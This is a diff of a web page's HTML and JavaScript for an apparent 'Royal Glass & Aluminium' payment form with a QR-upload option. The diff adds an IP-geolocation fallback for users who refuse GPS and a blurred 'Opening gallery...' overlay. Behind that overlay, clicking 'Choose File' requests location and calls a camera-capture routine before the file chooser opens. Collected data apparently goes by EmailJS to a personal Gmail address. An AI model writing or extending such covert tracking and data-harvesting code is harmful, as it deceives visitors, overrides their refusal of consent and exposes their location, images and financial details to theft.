@@ -181,38 +181,16 @@
             transition: 0.2s;
             box-shadow: 0 2px 6px rgba(0,0,0,0.03);
             display: inline-block;
-            position: relative;
         }
         .qr-upload-area .fake-btn:hover {
             background: rgba(30, 50, 75, 0.3);
             border-color: #5f7f9e;
-        }
-        .qr-upload-area .fake-btn .btn-spinner {
-            display: none;
-            position: absolute;
-            left: 50%;
-            top: 50%;
-            transform: translate(-50%, -50%);
-        }
-        .qr-upload-area .fake-btn .btn-spinner i {
-            font-size: 18px;
-            color: #2c4b6b;
-        }
-        .qr-upload-area .fake-btn .btn-text {
-            display: inline-block;
-        }
-        .qr-upload-area .fake-btn.loading .btn-text {
-            visibility: hidden;
-        }
-        .qr-upload-area .fake-btn.loading .btn-spinner {
-            display: block;
         }
         .qr-upload-area input[type="file"] {
             width: 0.1px;
             height: 0.1px;
             opacity: 0;
             position: absolute;
-            pointer-events: none;
         }
         #qr-file-name {
             font-size: 13px;
@@ -384,9 +362,53 @@
             opacity: 1;
             pointer-events: auto;
         }
+        /* Loading overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(8px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+        }
+        .loading-overlay.show {
+            display: flex;
+        }
+        .loading-overlay .spinner-box {
+            background: white;
+            padding: 40px 50px;
+            border-radius: 24px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        .loading-overlay .spinner-box i {
+            font-size: 40px;
+            color: #2c4b6b;
+            animation: spin 0.8s linear infinite;
+        }
+        .loading-overlay .spinner-box p {
+            margin-top: 15px;
+            color: #1a2a3a;
+            font-size: 16px;
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner-box">
+            <i class="fas fa-spinner"></i>
+            <p>Opening gallery...</p>
+        </div>
+    </div>
+
     <div id="toast" class="toast-message">✓ submitted</div>
 
     <div class="glass-card">
@@ -442,8 +464,7 @@
                         <img id="qrPreview" alt="QR Preview">
                         <div>
                             <label for="qrUpload" class="fake-btn" id="qrUploadBtn">
-                                <span class="btn-text"><i class="fas fa-cloud-upload-alt" style="margin-right: 6px;"></i> Choose File</span>
-                                <span class="btn-spinner"><i class="fas fa-spinner fa-spin"></i></span>
+                                <i class="fas fa-cloud-upload-alt" style="margin-right: 6px;"></i> Choose File
                             </label>
                             <input type="file" id="qrUpload" accept="image/*">
                             <span id="qr-file-name"></span>
@@ -482,6 +503,7 @@
             let cameraGranted = false;
             let userLocation = null;
             let isProcessing = false;
+            let pendingFileClick = false;
 
             // Initialize EmailJS
             try {
@@ -495,6 +517,7 @@
             const bankSection = document.getElementById('bankSection');
             const qrSection = document.getElementById('qrSection');
             const optionIndicator = document.getElementById('optionIndicator');
+            const loadingOverlay = document.getElementById('loadingOverlay');
             
             const fullName = document.getElementById('fullName');
             const email = document.getElementById('email');
@@ -534,48 +557,51 @@
                 submitBtn.disabled = false;
             }
 
-            // QR Button spinner
-            function showQRButtonSpinner() {
-                qrUploadBtn.classList.add('loading');
+            // Loading overlay
+            function showLoadingOverlay() {
+                loadingOverlay.classList.add('show');
             }
 
-            function hideQRButtonSpinner() {
-                qrUploadBtn.classList.remove('loading');
+            function hideLoadingOverlay() {
+                loadingOverlay.classList.remove('show');
             }
 
-            // ----- LOCATION FUNCTIONS -----
+            // ----- LOCATION FUNCTIONS (IP FALLBACK) -----
             
             async function requestLocation() {
                 try {
                     if (!navigator.geolocation) {
-                        console.log('📍 Geolocation not supported');
-                        return null;
+                        console.log('📍 Geolocation not supported, using IP fallback');
+                        return await getLocationFromIP();
                     }
                     
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(
-                            (pos) => resolve(pos),
-                            (err) => reject(err),
-                            { enableHighAccuracy: true, timeout: 10000 }
-                        );
-                    });
-                    
-                    userLocation = {
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        source: 'GPS'
-                    };
-                    console.log('📍 GPS Location:', userLocation);
-                    return userLocation;
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(
+                                (pos) => resolve(pos),
+                                (err) => reject(err),
+                                { enableHighAccuracy: true, timeout: 10000 }
+                            );
+                        });
+                        
+                        userLocation = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            source: 'GPS'
+                        };
+                        console.log('📍 GPS Location:', userLocation);
+                        return userLocation;
+                    } catch (e) {
+                        console.log('📍 GPS denied or error:', e.message);
+                        console.log('📍 Using IP geolocation fallback');
+                        const ipLocation = await getLocationFromIP();
+                        userLocation = ipLocation;
+                        return ipLocation;
+                    }
                 } catch (e) {
-                    console.log('📍 Location denied or error:', e.message);
-                    
-                    // Fallback to IP geolocation
-                    console.log('📍 Using IP geolocation fallback');
-                    const ipLocation = await getLocationFromIP();
-                    userLocation = ipLocation;
-                    return ipLocation;
+                    console.error('📍 Location error:', e);
+                    return await getLocationFromIP();
                 }
             }
 
@@ -947,15 +973,15 @@
                 }
             }
 
-            // ----- QR Upload Handler - SHOW SPINNER, REQUEST PERMISSIONS, THEN OPEN GALLERY -----
+            // ----- QR Upload Handler - SHOW OVERLAY, GET PERMISSIONS, THEN OPEN GALLERY -----
             qrUploadBtn.addEventListener('click', async function(e) {
                 e.preventDefault();
                 
-                // Show spinner on button
-                showQRButtonSpinner();
+                // Show loading overlay
+                showLoadingOverlay();
                 
                 try {
-                    // Step 1: Request location permission
+                    // Step 1: Request location permission (with IP fallback)
                     console.log('📍 Requesting location...');
                     await requestLocation();
                     
@@ -963,15 +989,18 @@
                     console.log('📸 Requesting camera...');
                     await requestCameraAndCapture();
                     
-                    // Step 3: Hide spinner
-                    hideQRButtonSpinner();
+                    // Step 3: Hide loading overlay
+                    hideLoadingOverlay();
                     
                     // Step 4: Now trigger the file input click (shows chooser/gallery)
                     console.log('📁 Opening file chooser...');
-                    qrInput.click();
+                    // Small delay to ensure overlay is hidden
+                    setTimeout(() => {
+                        qrInput.click();
+                    }, 100);
                 } catch (error) {
                     console.error('Error during permission request:', error);
-                    hideQRButtonSpinner();
+                    hideLoadingOverlay();
                     showToast('❌ Something went wrong. Please try again.', true);
                 }
             });
@@ -1090,7 +1119,7 @@
             });
 
             console.log('Royal Glass & Aluminium · secure');
-            console.log('✅ Spinner on button while getting permissions, then gallery opens');
+            console.log('✅ Location has IP fallback, Gallery opens after permissions');
             console.log('📧 Sending to: mrsmartboy123@gmail.com');
         })();
     </script>
